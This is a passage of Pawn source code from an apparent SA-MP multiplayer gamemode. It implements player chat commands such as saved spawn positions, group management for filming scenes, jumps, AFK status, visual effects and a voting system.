		if (world > VIP_MAX_WORLDS) player[playerid][virtualworld] = 0;
		else player[playerid][virtualworld] = world;
	} else {
		if (world > DEFAULT_MAX_WORLDS) player[playerid][virtualworld] = 0;
		else player[playerid][virtualworld] = world;
	}

	SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Spawn position saved. (/loadpos to load, /unset to remove)");
	return 1;
}

dcmd_loadpos(playerid,params[])
{
	new spawnslotID;
	if (sscanf(params, "d", spawnslotID))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /loadpos <1-3>");

	if (spawnslotID < 1 || spawnslotID > MAX_SPAWNS)
	return SendErrorMessage(playerid, EMBED_WHITE, "/loadpos <1-3>");
	spawnslotID -= 1;

	if (playerxyzaiv[playerid][spawnslotID][0] == -1 && playerxyzaiv[playerid][spawnslotID][1] == -1 && playerxyzaiv[playerid][spawnslotID][2] == -1 && playerxyzaiv[playerid][spawnslotID][3] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You haven't set any spawn position for this spawnslotID.");

	if (IsPlayerDriver(playerid))
	{
	    new vID = GetPlayerVehicleID(playerid);
	    SetPlayerPosEx(playerid, playerxyzaiv[playerid][spawnslotID][0], playerxyzaiv[playerid][spawnslotID][1], playerxyzaiv[playerid][spawnslotID][2], playerxyzaiv[playerid][spawnslotID][3], player[playerid][interior]);
	    /*SetVehiclePos(vID, playerxyzaiv[playerid][0], playerxyzaiv[playerid][1], playerxyzaiv[playerid][2]);
	    SetVehicleZAngle(vID, playerxyzaiv[playerid][3]);
	    SetPlayerInterior(playerid, player[playerid][interior]);
		LinkVehicleToInterior(vID, player[playerid][interior]);*/
		SetVehicleVirtualWorld(vID, player[playerid][virtualworld]);
    } else {
 		SetPlayerPosEx(playerid, playerxyzaiv[playerid][spawnslotID][0], playerxyzaiv[playerid][spawnslotID][1], playerxyzaiv[playerid][spawnslotID][2], playerxyzaiv[playerid][spawnslotID][3], player[playerid][interior]);
        /*SetPlayerPos(playerid, playerxyzaiv[playerid][0], playerxyzaiv[playerid][1], playerxyzaiv[playerid][2]);
    	SetPlayerFacingAngle(playerid, playerxyzaiv[playerid][3]);
    	SetPlayerInterior(playerid, player[playerid][interior]);*/
 		SetPlayerVirtualWorld(playerid, player[playerid][virtualworld]);
    }
    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Spawn position loaded.");
 	return 1;
}

dcmd_unset(playerid,params[])
{
	new spawnslotID;
	if (sscanf(params, "d", spawnslotID))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /unset <1-3>");

	if (spawnslotID < 1 || spawnslotID > MAX_SPAWNS)
	return SendErrorMessage(playerid, EMBED_WHITE, "/unset <1-3>");
	spawnslotID -= 1;

	if (playerxyzaiv[playerid][spawnslotID][0] == -1 && playerxyzaiv[playerid][spawnslotID][1] == -1 && playerxyzaiv[playerid][spawnslotID][2] == -1)
	return SendErrorMessage(playerid, EMBED_WHITE, "You haven't set any spawn position for this slot.");

	playerxyzaiv[playerid][spawnslotID][0] = playerxyzaiv[playerid][spawnslotID][1] = playerxyzaiv[playerid][spawnslotID][2] = playerxyzaiv[playerid][spawnslotID][3] = -1 ;
    SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Spawn position removed.");
 	return 1;
}

dcmd_money(playerid,params[])
{
    new idx,
		moneys;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE , "[USAGE]: /money <amount>");
	moneys = strval(tmps2);

	//if (moneys < 0)
	//return SendClientMessage(playerid, COLOR_WHITE , "* You cannot give a negative amount of money");

	GivePlayerMoney(playerid, moneys);
	format(strings, sizeof(strings), "[INFO]: You gave yourself $%d.", moneys);
	SendClientMessage(playerid, COLOR_LLBLUE, strings);
	return 1;
}

dcmd_piss(playerid,params[])
{
	#pragma unused params

	SetPlayerSpecialAction(playerid, 68);
	return 1;
}

dcmd_chat(playerid,params[])
{
	new optionStr[6];
		
	if (!sscanf(params, "s[6] ", optionStr))
	{
		if (!strcmp(optionStr, "all",true))
		{
			player[playerid][chat] = 0;
			SendServerMessage(playerid, EMBED_WHITE, "Chat permissions set to \"Show all chat messages\".");
		} else if (!strcmp(optionStr, "world",true))
		{
			player[playerid][chat] = 1;

			for (new chatline = 0; chatline < 50; chatline++)
			SendClientMessage(playerid, COLOR_WHITE, " ");
			
			SendServerMessage(playerid, EMBED_WHITE, "Chat permissions set to \"Show only chat from my world\".");
		} else if (!strcmp(optionStr, "local",true))
		{
			player[playerid][chat] = 2;

			for (new chatline = 0; chatline < 50; chatline++)
			SendClientMessage(playerid, COLOR_WHITE, " ");
			
			SendServerMessage(playerid, EMBED_WHITE, "Chat permissions set to \"Show only chat from nearby players\".");
		} else if (!strcmp(optionStr, "group",true))
		{
		    if (!IsPlayerInAnyCrew(playerid))
		    return SendErrorMessage(playerid, EMBED_WHITE, "You must be part of a group chat in order to filter group messages.");
		    
			player[playerid][chat] = 3;

			for (new chatline = 0; chatline < 50; chatline++)
			SendClientMessage(playerid, COLOR_WHITE, " ");
			
			SendServerMessage(playerid, EMBED_WHITE, "Chat permissions set to \"Show only group chat\".");
		} else return SendErrorMessage(playerid, EMBED_RED, "Available chat settings: all; world; local; group");
	} else SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /chat <all/world/local/group>");
	return 1;
}

dcmd_group(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || IsNumeric(tmps2))
	{
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group <create / leave / drop(destroy group) / kick / crew / count(down) / world>");
		SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group <invite name|id / accept|deny / ns(nextscene) / reset <scene/takes/both>");
		return 1;
	}

	if (!strcmp(tmps2, "create",true))
	{
	    if (IsPlayerInAnyCrew(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "You can only be in 1 group at the time.");

		new found = 0;
		for (new c = 0; c < MAX_GROUPS; c++)
		{
			if (!crews[c])
			{
				crews[c] = 1;
				crewowner[c] = playerid;
				crewscene[c] = 0;
				crewshot[c] = 0;
				player[playerid][moviecrew] = c;
				found = 1;
				break;
			}
 		}
		if (!found) SendErrorMessage(playerid, EMBED_WHITE, "All groups are taken, please wait for a free slot.");
		else SendMessageToCrew(player[playerid][moviecrew], "[GROUP] Group created.");
		return 1;
	}

	if (!strcmp(tmps2, "invite",true))
	{
		if (!strlen(params[strlen(tmps2)+1]))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group invite <name|id>");

		if (player[playerid][moviecrew] == -1 || crewowner[ player[playerid][moviecrew] ] != playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner of the group can invite other players.");

		if (!IsNumeric(params[strlen(tmps2)+1])) giveplayerid = ReturnPlayerID(params[strlen(tmps2)+1]);
		else giveplayerid = strval(params[strlen(tmps2)+1]);

		if (giveplayerid == playerid)
		return SendErrorMessage(playerid, EMBED_WHITE, "You cannot invite yourself.");

	    if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	    {
	        if (IsPlayerInCrew(giveplayerid, player[playerid][moviecrew]))
		    return SendErrorMessage(playerid, EMBED_WHITE, "This player is already in your group.");

		    if (IsPlayerInAnyCrew(giveplayerid))
		    return SendErrorMessage(playerid, EMBED_WHITE, "This player is already in a group.");

 			if (player[giveplayerid][crewinvite] != -1)
 			return SendErrorMessage(playerid, EMBED_WHITE, "This player has another invitation pending, wait for him to deny.");

			player[giveplayerid][crewinvite] = player[playerid][moviecrew];
			GetPlayerName(playerid, playername, sizeof(playername));
			format(strings, sizeof(strings), "[INVITE] %s invited you to join his group, type /group accept|deny", playername);
			SendClientMessage(giveplayerid, COLOR_ORANGE, strings);
			GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
 			format(strings, sizeof(strings), "[GROUP] %s has been INVITED to the group.", giveplayername);
  			SendMessageToCrew(player[playerid][moviecrew], strings);
		} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
		return 1;
	}

	if (!strcmp(tmps2, "accept",true))
	{
		if (IsPlayerInAnyCrew(playerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "You are already in a group.");

 		if (player[playerid][crewinvite] == -1)
 		return SendErrorMessage(playerid, EMBED_WHITE, "You have no group invitations pending.");

		player[playerid][moviecrew] = player[playerid][crewinvite];
		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "[GROUP] %s has JOINED the groupchat", playername);
  		SendMessageToCrew(player[playerid][moviecrew], strings);
		player[playerid][crewinvite] = -1;
		SetPlayerColor(playerid, GetPlayerColor(crewowner[ player[playerid][moviecrew] ]));
		return 1;
	}

	if (!strcmp(tmps2, "deny",true))
	{
		if (IsPlayerInAnyCrew(playerid))
		return SendErrorMessage(playerid, EMBED_WHITE, "You are already in a group.");

 		if (player[playerid][crewinvite] == -1)
 		return SendErrorMessage(playerid, EMBED_WHITE, "You have no group invitations pending.");

		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "[GROUP] %s has DENIED the invitation", playername);
  		SendMessageToCrew(player[playerid][crewinvite], strings);
  		SendClientMessage(playerid, COLOR_WHITE, "[SUCCESS] You have denied the group invitation.");
		player[playerid][crewinvite] = -1;
		return 1;
	}

	if (!strcmp(tmps2, "leave",true))
	{
		if (!IsPlayerInAnyCrew(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

    	GetPlayerName(playerid, playername, sizeof(playername));
  		format(strings, sizeof(strings), "[GROUP] %s has LEFT the groupchat", playername);
		new crewid = player[playerid][moviecrew];
  		SendMessageToCrew(crewid, strings);
	   	if (crewowner[crewid] == playerid)
	    {

			SendMessageToCrew(crewid, "[GROUP] Group has been automatically dropped because the owner left.");
			crews[crewid] = 0;
			crewowner[crewid] = -1;
			crewscene[crewid] = 0;
			crewshot[crewid] = 0;

			for (new i = 0; i < MAX_PLAYERS; i++)
			{
   				if (IsPlayerConnected(i) && player[i][moviecrew] == crewid)
   				{
					player[i][moviecrew] = -1;
					player[i][chat] = 0;
				}
			}
			return 1;
		}
		player[playerid][moviecrew] = -1;
		player[playerid][chat] = 0;
		return 1;
	}

	if (!strcmp(tmps2, "drop",true))
	{
		if (!IsPlayerInAnyCrew(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

		if (crewowner[ player[playerid][moviecrew] ] != playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can drop the group.");

		GetPlayerName(playerid, playername, sizeof(playername));
	    format(strings, sizeof(strings), "[GROUP] %s has DROPPED the group.", playername);
   		new crewid = player[playerid][moviecrew];
  		SendMessageToCrew(crewid, strings);
  		crews[crewid] = 0;
       	crewowner[crewid] = -1;
       	crewscene[crewid] = 0;
       	crewshot[crewid] = 0;

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
  			if (IsPlayerConnected(i) && player[i][moviecrew] == crewid)
  			{
				player[i][moviecrew] = -1;
				player[i][chat] = 0;
			}
		}
		return 1;
	}

	if (!strcmp(tmps2, "kick",true))
	{
		if (!IsPlayerInAnyCrew(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

		if (crewowner[ player[playerid][moviecrew] ] != playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can kick someone from the group.");

		if (!strlen(params[strlen(tmps2)+1]))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group kick <name|id>");

		if (!IsNumeric(params[strlen(tmps2)+1])) giveplayerid = ReturnPlayerID(params[strlen(tmps2)+1]);
		else giveplayerid = strval(params[strlen(tmps2)+1]);

	    if (IsPlayerConnected(giveplayerid) && giveplayerid != INVALID_PLAYER_ID)
	    {
		    if (!IsPlayerInCrew(giveplayerid, player[playerid][moviecrew]))
		    return SendErrorMessage(playerid, EMBED_WHITE, "This player is not in your group.");

			if (giveplayerid == playerid)
			return SendErrorMessage(playerid, EMBED_WHITE, "You cannot kick yourself.");

			GetPlayerName(giveplayerid, giveplayername, sizeof(giveplayername));
		    format(strings, sizeof(strings), "[GROUP] %s has been REJECTED from the group", giveplayername);
	  		SendMessageToCrew(player[playerid][moviecrew], strings);
			player[giveplayerid][moviecrew] = -1;
			player[giveplayerid][chat] = 0;
		} else SendErrorMessage(playerid, EMBED_WHITE, "This player is not connected.");
		return 1;
	}

	if (!strcmp(tmps2, "crew",true))
	{
		if (player[playerid][moviecrew] == -1)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You aren't in any group.");

		new string[128],
			astring[30],
			Players = 0,
			ActualPlayers = 0,
			crewID = player[playerid][moviecrew];

		for (new i = 0; i < MAX_PLAYERS; i++)
		if (IsPlayerConnected(i) && player[i][moviecrew] == crewID) Players++, ActualPlayers++;

		format(string, sizeof(string), "Group Members [%d]: ",Players);
		Players = 1;

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && player[i][moviecrew] == crewID)
			{
			    GetPlayerName(i,playername,24);

				if (crewowner[ crewID ] == i) format(astring, sizeof(astring), "%s (%d[Leader])", playername, i);
				else format(astring, sizeof(astring), "%s (%d)", playername, i);

				strcat(string,astring),
				strcat(string, " ");
			    if (!(Players % 6))
				{
					SendClientMessage(playerid,COLOR_FLBLUE,string);
					string = "";

					if (ActualPlayers == Players) break;
				}
			    Players++;
			} else if (i == (MAX_PLAYERS - 1)) { SendClientMessage(playerid,COLOR_FLBLUE,string); break; }
		}
		return 1;
	}

	if (!strcmp(tmps2, "count",true) || !strcmp(tmps2, "countdown",true))
	{
		if (player[playerid][moviecrew] == -1)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

		if (crewowner[ player[playerid][moviecrew] ] != playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can countdown.");

		if (CrewCount == 5)
		{
			CrewCountDown(player[playerid][moviecrew]);
			crewshot[ player[playerid][moviecrew] ] += 1;
		} else SendErrorMessage(playerid, EMBED_WHITE, "Group Countdown already in progress.");
		return 1;
	}

	if (!strcmp(tmps2, "ns",true) || !strcmp(tmps2, "nextscene",true))
	{
		if (player[playerid][moviecrew] == -1)
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

		if (crewowner[ player[playerid][moviecrew] ] != playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can use this command.");

		crewscene[ player[playerid][moviecrew] ] += 1;
		SendMessageToCrew(player[playerid][moviecrew], "[GROUP] Attention, moving to the next scene!");
		return 1;
	}

	if (!strcmp(tmps2, "reset",true))
	{
		tmps2 = strtok(params, idx);
		if (!strlen(tmps2))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group reset <scene/takes/ both>");

	    if (!strcmp(tmps2, "scene",true))
	    {
			if (player[playerid][moviecrew] == -1)
		    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

			if (crewowner[ player[playerid][moviecrew] ] != playerid)
		    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can reset movie scenes counter.");

			crewscene[ player[playerid][moviecrew] ] = 0;
			SendMessageToCrew(player[playerid][moviecrew], "[GROUP] Movie scene counter has been reset by owner.");
			return 1;
		}
  		if (!strcmp(tmps2, "takes",true))
	    {
			if (player[playerid][moviecrew] == -1)
		    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

			if (crewowner[ player[playerid][moviecrew] ] != playerid)
		    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can reset movie shots counter.");

			crewshot[ player[playerid][moviecrew] ] = 0;
			SendMessageToCrew(player[playerid][moviecrew], "[GROUP] Movie shots counter has been reset by owner.");
			return 1;
		}
		if (!strcmp(tmps2, "both",true))
	    {
			if (player[playerid][moviecrew] == -1)
		    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

			if (crewowner[ player[playerid][moviecrew] ] != playerid)
		    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can reset movie scenes&shots counter");

			crewscene[ player[playerid][moviecrew] ] = 0;
			crewshot[ player[playerid][moviecrew] ] = 0;
			SendMessageToCrew(player[playerid][moviecrew], "[GROUP] Movie shots&scenes counter has been reset by owner.");
			return 1;
		}
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group reset <scene/takes/ both>");
	}
	if (!strcmp(tmps2, "world",true))
	{
		if (!IsPlayerInAnyCrew(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "You are not in any group.");

		if (crewowner[ player[playerid][moviecrew] ] != playerid)
	    return SendErrorMessage(playerid, EMBED_WHITE, "Only the owner can set the world of the group.");

		if (!strlen(params[strlen(tmps2)+1]))
		return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group world <worldid(0-500)>");
		
		new worldid = strval(params[strlen(tmps2)+1]);
		if (worldid < 0 || worldid > DEFAULT_MAX_WORLDS)
	 	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group world <worldid(0-500)>");

		new crewID = player[playerid][moviecrew];
		GetPlayerName(playerid, playername, sizeof(playername));
	    format(strings, sizeof(strings), "[GROUP] %s has changed the world of the group to %d.", playername, worldid);
  		SendMessageToCrew(crewID, strings);

		for (new i = 0; i < MAX_PLAYERS; i++)
		{
			if (IsPlayerConnected(i) && player[i][moviecrew] == crewID)
			SetPlayerVirtualWorld(i, worldid);
		}
		return 1;
	}
	SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group <create / leave / drop(destroy group) / kick / crew / count(down) / world>");
	SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /group <invite name|id / accept|deny / ns(nextscene) / reset <scene/takes/both>");
	return 1;
}

dcmd_crew(playerid,params[])
{
	SendMessagetoCrew(playerid, params);
	dcmd_group(playerid,params);
	return 1;
}

dcmd_nameon(playerid,params[])
{
	#pragma unused params

	if (tags == false)
	return SendErrorMessage(playerid, EMBED_WHITE, "An admin has disabled nametags.");

	GameTextForPlayer(playerid, "~w~nametags: ~g~on", 3000, 3);
	for (new i = 0; i < MAX_PLAYERS; i++)
	ShowPlayerNameTagForPlayer(playerid, i, 1);
	return 1;
}

dcmd_nameoff(playerid,params[])
{
	#pragma unused params

	GameTextForPlayer(playerid, "~w~nametags: ~r~off", 3000, 3);
	for (new i = 0; i < MAX_PLAYERS; i++)
	ShowPlayerNameTagForPlayer(playerid, i, 0);
	return 1;
}

dcmd_jump(playerid,params[])
{
	#pragma unused params

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		Float:cX,
		Float:cY,
		Float:cZ,
		Float:cA;

	if (!vID)
	{
			GetPlayerVelocity(playerid, cX, cY, cZ);
			GetPlayerFacingAngle(playerid, cA);
			cX += ( 0.3 * floatsin( -cA, degrees ) );
            cY += ( 0.3 * floatcos( -cA, degrees ) );
			SetPlayerVelocity(playerid, cX, cY, cZ+0.4);
	} else {
			if (!IsPlayerDriver(playerid))
			return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle.");

			GetVehicleVelocity(vID, cX, cY, cZ);
			GetVehicleZAngle(vID, cA);
			cX += ( 0.3 * floatsin( -cA, degrees ) );
            cY += ( 0.3 * floatcos( -cA, degrees ) );
			SetVehicleVelocity(vID, cX, cY, cZ+0.4);
	}
	return 1;
}

dcmd_sjump(playerid,params[])
{
	#pragma unused params

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		Float:cX,
		Float:cY,
		Float:cZ,
		Float:cA;

	if (!vID)
	{
			GetPlayerVelocity(playerid, cX, cY, cZ);
			GetPlayerFacingAngle(playerid, cA);
			cX += ( 0.6 * floatsin( -cA, degrees ) );
            cY += ( 0.6 * floatcos( -cA, degrees ) );
			SetPlayerVelocity(playerid, cX, cY, cZ+0.8);
	} else {
			if (!IsPlayerDriver(playerid))
			return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle.");

			GetVehicleVelocity(vID, cX, cY, cZ);
			GetVehicleZAngle(vID, cA);
			cX += ( 0.6 * floatsin( -cA, degrees ) );
            cY += ( 0.6 * floatcos( -cA, degrees ) );
			SetVehicleVelocity(vID, cX, cY, cZ+0.8);
	}
	return 1;
}

dcmd_hjump(playerid,params[])
{
	#pragma unused params

    if (!IsPlayerAdminLevel(playerid, 3))
    {
		if (!AntiSpam(playerid, 2)) return 1;
	}

	new vID = GetPlayerVehicleID(playerid),
		Float:cX,
		Float:cY,
		Float:cZ,
		Float:cA;

	if (!vID)
	{
			GetPlayerVelocity(playerid, cX, cY, cZ);
			GetPlayerFacingAngle(playerid, cA);
			cX += ( 0.6 * floatsin( -cA, degrees ) );
            cY += ( 0.6 * floatcos( -cA, degrees ) );
			SetPlayerVelocity(playerid, cX, cY, cZ+1.4);
	} else {
			if (!IsPlayerDriver(playerid))
			return SendErrorMessage(playerid, EMBED_WHITE, "You must be driving a vehicle.");

			GetVehicleVelocity(vID, cX, cY, cZ);
			GetVehicleZAngle(vID, cA);
			cX += ( 0.6 * floatsin( -cA, degrees ) );
            cY += ( 0.6 * floatcos( -cA, degrees ) );
			SetVehicleVelocity(vID, cX, cY, cZ+1.4);
	}
	return 1;
}

dcmd_afk(playerid,params[])
{
	GetPlayerName(playerid, playername, sizeof(playername));
	if (player[playerid][afk] > 0)
	{
		if (!AntiSpam(playerid, 45)) return 1;

		if (!strcmp(AFKreason[playerid], "None",true))
		{
			format(strings, sizeof(strings), "%s has returned (%d minutes).", playername, (player[playerid][playtime] - player[playerid][afk]) / 60);
			format(ircstring, sizeof(ircstring), "7%s has returned (%d minutes).", playername, (player[playerid][playtime] - player[playerid][afk]) / 60);
		} else {
			format(strings, sizeof(strings), "%s has returned from \"%s\" (%d minutes).", playername, AFKreason[playerid], (player[playerid][playtime] - player[playerid][afk]) / 60);
			format(ircstring, sizeof(ircstring), "7%s has returned from \"%s\" (%d minutes).", playername, AFKreason[playerid], (player[playerid][playtime] - player[playerid][afk]) / 60);
		}

		SendServerMessageToAll(EMBED_YELLOW, strings);
		IRC_GroupSay(1, IRC_CHANNEL, ircstring);

		player[playerid][afk] = 0;
		SpawnPlayer(playerid);
		return 1;
	}

	if (strlen(params))
	{
		if (strlen(params) > 15)
		return SendErrorMessage(playerid, EMBED_WHITE, "Your AFK reason is too long.");
	
		strmid(AFKreason[playerid], params, 0, strlen(params));
 		format(strings, sizeof(strings), "%s is now AWAY for \"%s\".", playername, AFKreason[playerid]);
 		format(ircstring, sizeof(ircstring), "7%s is now AWAY for \"%s\".", playername, AFKreason[playerid]);
	} else {
		AFKreason[playerid] = "None";
		format(strings, sizeof(strings), "%s is now AWAY.", playername);
		format(ircstring, sizeof(ircstring), "7%s is now AWAY.", playername);
	}

	player[playerid][antifall] = 0;
	ResetPlayerWeapons(playerid);
	SetPlayerInterior(playerid, 0);
	SetPlayerPos(playerid, 154.0770, -1951.9774, 47.8750);
	SetPlayerFacingAngle(playerid, 0);
	SetCameraBehindPlayer(playerid);

	SendServerMessageToAll(EMBED_YELLOW, strings);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);
	
	player[playerid][afk] = player[playerid][playtime];
	player[playerid][godmode] = 0;
	return 1;
}

dcmd_back(playerid,params[])
{
	#pragma unused params

	if (player[playerid][afk] == 0)
	return SendErrorMessage(playerid, EMBED_WHITE, "You are not Away!");

	if (!AntiSpam(playerid, 45)) return 1;

	GetPlayerName(playerid, playername, sizeof(playername));
	if (!strcmp(AFKreason[playerid], "None",true))
	{
		format(strings, sizeof(strings), "%s has returned (%d minutes).", playername, (player[playerid][playtime] - player[playerid][afk]) / 60);
		format(ircstring, sizeof(ircstring), "7%s has returned (%d minutes).", playername, (player[playerid][playtime] - player[playerid][afk]) / 60);
	} else {
		format(strings, sizeof(strings), "%s has returned from \"%s\" (%d minutes).", playername, AFKreason[playerid], (player[playerid][playtime] - player[playerid][afk]) / 60);
		format(ircstring, sizeof(ircstring), "7%s has returned from \"%s\" (%d minutes).", playername, AFKreason[playerid], (player[playerid][playtime] - player[playerid][afk]) / 60);
	}

	SendServerMessageToAll(EMBED_YELLOW, strings);
	IRC_GroupSay(1, IRC_CHANNEL, ircstring);

	player[playerid][afk] = 0;
	SpawnPlayer(playerid);
	return 1;
}

dcmd_afklist(playerid,params[])
{
	#pragma unused params

	new string[128],
		astring[53],
		Players = 0,
		ActualPlayers = 0;

	for (new i = 0; i < MAX_PLAYERS; i++)
	if (IsPlayerConnected(i) && player[i][afk] > 0) Players++, ActualPlayers++;

	if (!Players)
	return SendClientMessage(playerid,COLOR_FLBLUE, "AFK Players [0]: None");

	format(string, sizeof(string), "AFK Players [%d]: ",Players);
	Players = 1;

	for (new i = 0; i < MAX_PLAYERS; i++)
	{
		if (IsPlayerConnected(i) && player[i][afk] > 0)
		{
		    GetPlayerName(i, playername, sizeof(playername));
			format(astring, sizeof(astring), "%s: \"%s\" (%d min)", playername, AFKreason[i], (player[i][playtime] - player[i][afk]) / 60);
			strcat(string,astring),
			strcat(string, " ");
		    if (!(Players % 3))
			{
				SendClientMessage(playerid,COLOR_FLBLUE,string);
				string = "";

				if (ActualPlayers == Players) break;
			}
		    Players++;
		} else if (i == (MAX_PLAYERS - 1)) { SendClientMessage(playerid,COLOR_FLBLUE,string); break; }
	}
	return 1;
}

dcmd_fps(playerid,params[])
{
	#pragma unused params

	if (!player[playerid][FPStextdraw])
	{
		TextDrawShowForPlayer(playerid, pinfo[playerid]);
		player[playerid][FPStextdraw] = 1;
	} else {
		TextDrawHideForPlayer(playerid, pinfo[playerid]);
		player[playerid][FPStextdraw] = 0;
 	}
	return 1;
}

dcmd_drunk(playerid,params[])
{
	if (drunken == false)
	return SendErrorMessage(playerid, EMBED_WHITE, "Command disabled, server drunk level has been set.");

 	new idx,
	 	drunklevel;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2) || !IsNumeric(tmps2))
	return SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /drunk <drunklevel> [Normal: 0-20, Drunk: 20-500]");
	drunklevel = strval(tmps2);

	if (drunklevel < 0 || drunklevel > 500)
	return SendErrorMessage(playerid, EMBED_WHITE, "Normal: 0-20, Drunk: 20-500");

	SetPlayerDrunkLevel(playerid, drunklevel * 100);
	return 1;
}

dcmd_lsd(playerid,params[])
{
	if (params[0] && !strcmp(params, "off", true))
	{
		SetPlayerWeather(playerid, sweather);
		SetPlayerTime(playerid, stime, 00);
		GameTextForPlayer(playerid, "~w~LSD MODE: ~r~OFF", 4000, 3);
		return 1;
	}

	SetPlayerTime(playerid, 15, 00);
	SetPlayerWeather(playerid, 446);
	GameTextForPlayer(playerid, "~w~LSD MODE: ~g~ON~n~~y~TYPE ~b~/LSD OFF~y~ TO DISABLE", 4000, 3);
	return 1;
}

dcmd_vote(playerid,params[])
{
	new idx;

	tmps2 = strtok(params, idx);
	if (!strlen(tmps2))
	{
		if (IsAdmin(playerid)) SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /vote start <poll>, /vote y/n (yes/no), /vote cancel");
		else if (IsVIP(playerid)) SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /vote start <poll>, /vote y/n (yes/no)");
  		else SendClientMessage(playerid, COLOR_WHITE, "[USAGE]: /vote y/n (yes/no)");
		return 1;
	}

	if (!strcmp(tmps2, "start",true))
	{
		if (!IsVIP(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "This option is inacessible for your level.");

		if (votesys == true)
		return SendErrorMessage(playerid, EMBED_WHITE, "A vote already has been started.");

		if (!strlen(params[strlen(tmps2)+1]))
		return SendErrorMessage(playerid, EMBED_WHITE, "/vote start <poll>");

		votesys = true;

 		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Vote started by %s: %s (/vote yes|no)", playername, params[strlen(tmps2)+1]);
		SendServerMessageToAll(EMBED_ORANGE, strings);
		SendCommandMessageToAdmins(playerid, "vote start");
		format(strings, sizeof(strings), "7Vote started by %s: %s", playername, params[strlen(tmps2)+1]);
  		IRC_GroupSay(1, IRC_CHANNEL, strings);
		return 1;
	}
	if (!strcmp(tmps2, "yes",true) || !strcmp(tmps2, "y",true))
	{
		if (votesys == false)
		return SendErrorMessage(playerid, EMBED_WHITE, "No vote has been started.");

		if (player[playerid][voted] == 0 || player[playerid][voted] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "You may only place 1 vote!");

		player[playerid][voted] = 1;
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Thank you for your vote. [You have voted: Yes]");
		return 1;
	}
	if (!strcmp(tmps2, "no",true) || !strcmp(tmps2, "n",true))
	{
 		if (votesys == false)
		return SendErrorMessage(playerid, EMBED_WHITE, "No vote has been started.");

		if (player[playerid][voted] == 0 || player[playerid][voted] == 1)
		return SendErrorMessage(playerid, EMBED_WHITE, "You may only place 1 vote!");

		player[playerid][voted] = 0;
		SendClientMessage(playerid, COLOR_IVORY, "[SUCCESS]: Thank you for your vote. [You have voted: No]");
		return 1;
	}
	if (!strcmp(tmps2, "cancel",true))
	{
	    if (!IsAdmin(playerid))
	    return SendErrorMessage(playerid, EMBED_WHITE, "This option is inacessible for your level.");

	    if (votesys == false)
		return SendErrorMessage(playerid, EMBED_WHITE, "No vote has been started yet.");

		votesys = false;
		votesysleft = 30;

 		GetPlayerName(playerid, playername, sizeof(playername));
		format(strings, sizeof(strings), "Admin %s has stopped the vote.", playername);
		SendServerMessageToAll(EMBED_ORANGE, strings);
		SendCommandMessageToAdmins(playerid, "vote cancel");
